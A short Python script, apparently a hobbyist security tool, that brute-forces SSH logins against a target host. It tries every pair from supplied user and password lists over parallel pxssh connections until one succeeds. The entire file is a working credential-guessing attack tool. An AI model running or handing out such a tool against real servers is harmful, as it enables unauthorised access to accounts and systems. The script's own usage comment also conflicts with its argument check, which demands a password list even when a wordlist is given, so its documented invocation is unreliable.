# -*- coding: utf-8 -*-
# @Autor: Diego Rodrigues Pereira
# Comando: python ssh_bruteforce.py -H 192.168.1.1 -U users.txt -W wordlist.txt 
import optparse
from pexpect import pxssh
import time
import threading
import os

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found, Fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print('[+] Good , Key Found: ' + password)
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()


def run():
    parser = optparse.OptionParser('usage: '+'-H <target host> -U <userlist> -P <passlist>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-U', dest='userList', type='string', help='specify user list file')
    parser.add_option('-P', dest='passList', type='string', help='specify password list file')
    parser.add_option('-W', dest='wordlist', type='string', help='specify wordlist file')
    parser.add_option('-c', dest='count', type='int', help='specify the max ssh connect count, default 5', default=5)
    (options, args) = parser.parse_args()

    global connection_lock
    connection_lock = threading.BoundedSemaphore(options.count)

    host = options.tgtHost
    userListFile = options.userList
    passListFile = options.passList
    wordlistFile = options.wordlist

    if host == None or userListFile == None or passListFile == None:
        print(parser.usage)
        exit(0)

    with open(userListFile, 'r') as users:
        userList = users.read().splitlines()

    if wordlistFile:
        with open(wordlistFile, 'r') as f:
            passList = f.read().splitlines()
    else:
        with open(passListFile, 'r') as passes:
            passList = passes.read().splitlines()

    for user in userList:
        for password in passList:
            if Found:
                print("[*] Exiting: Key Found")
                exit(0)
            if Fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)
            connection_lock.acquire()
            print("[-] Testing: " + user + " / " + password)
            t = threading.Thread(target=connect, args=(host, user, password, True))
            t.start()

if __name__ == '__main__':
    run()
